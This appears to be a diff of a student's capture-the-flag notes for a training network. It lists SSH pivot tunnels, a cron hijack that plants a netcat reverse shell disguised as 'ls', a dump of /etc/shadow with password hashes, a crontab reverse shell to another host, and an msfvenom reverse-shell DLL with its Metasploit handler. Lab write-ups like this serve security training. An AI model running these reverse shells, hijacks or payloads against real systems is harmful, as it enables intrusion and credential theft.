@@ -580,14 +580,25 @@ Malware: unknown
 Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
 
 student@lin-ops:~$ ssh student@10.50.43.220 -L 12500:192.168.28.105:2222
-student@lin-ops:~$ ssh comrade@192.168.28.105 -p 12500 -L 12501:192.168.28.27:22	-Pivot:ftp
+student@lin-ops:~$ ssh comrade@localhost -p 12500 -L 12501:192.168.28.27:22	-Pivot:ftp
 student@lin-ops:~$ ssh comrade@localhost -p 12501 -L 12502:192.168.28.12:22		-T1:lin2
 student@lin-ops:~$ ssh comrade@localhost -p 12502					-T2:lin1
 
+in var/spool/crontab
+	a script is running on some user to run ls from /tmp, but the script is written using "." dot, which is vulnerable
+make a new script to hijack this job
+
+vim ls
+#!/bin/bash
+nc 127.0.0.1 8888 -e /bin/bash
+
+> nc -lvp 8888
+	-wait, will automatically connect to remote shell on the vulnerable user (billybob)
 
 billybob
 sudo -l
 	(ALL) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff, /bin/cat
+								   ^^^^^^^
 sudo cat /etc/shadow
 root:$6$/3RL8PUH$VdeUuKr75jSALs9jmLTGKMzxkZvhsRzmPsiCYM9cg.AODP1YgA.JWajSkknNxI0ptS/pK8PIOXMaXcvd3IgRT.:18934:0:99999:7:::
 zeus:$6$V34Nv7Ib$.PZChAQgzH9FMTfoUN0X3Y2mUIT3/rXju7cmXa2mAVTAZscB48slP8A333kYxrtlPzMLN9yEd5wZnQJe4Wzbz/:18934:0:99999:7:::
@@ -635,4 +646,54 @@ zeus:ghjcnbnenrf:18934:0:99999:7:::
 crontab -e
 * * * * * nc 192.168.28.135 33403 -e /bin/bash
 
+ON lin1 (T2)
+find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files
+
+
+
+===================================================================
+CTFd10
+
+Scheme of Maneuver:
+>Jump Box
+->Pivot: 192.168.28.105
+-->T1: 192.168.28.5
+
+Target Section:
+
+Pivot
+Hostname: ftp.site.donovia
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: donovian-windows-private
+IP: 192.168.28.5
+OS: Windows ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: 3389
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+find the dll to hijack, in this CTF, it was in the text file of the suspicious directory, 
+just search for "dll" in notepad
+
+student@lin-ops:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.50.36.151 LPORT=8888 -f dll > hijackmeplz.dll
+PS C:\MemoryStatus> scp student@10.50.36.151:hijackmeplz.dll .		-pulls it from home dir of linOps
+msfconsole
+use multi/handler
+set payload windows/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 8888
+show options
+exploit
+
+RESTART tunnel, but not rdp connection. wait till it connects to the msfconsole terminator.
+Navigate to Admin's desktop using dir(cd) and ls. to read flag use
+type <flag.file>
 
